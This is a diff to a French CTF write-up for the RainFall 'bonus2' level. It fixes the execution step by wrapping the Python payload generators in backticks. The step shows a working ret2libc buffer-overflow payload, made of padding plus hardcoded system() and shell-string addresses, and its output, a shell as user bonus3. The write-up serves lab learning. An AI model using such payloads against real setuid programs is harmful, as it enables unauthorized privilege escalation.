@@ -17,7 +17,7 @@ Celui ci nécessite d'appeler le pointeur de la fonction system, d'y ajouter ens
 #### Etape 4 : Execution 
 
 ```bash
-bonus2@RainFall:~$ ./bonus2 python -c 'print "A"*40' python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7" + "\x8a\x84\x04\x08" + "\x58\xcc\xf8\xb7"'
+bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7" + "\x8a\x84\x04\x08" + "\x58\xcc\xf8\xb7"'`
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�淊X��
 $ whoami
 bonus3
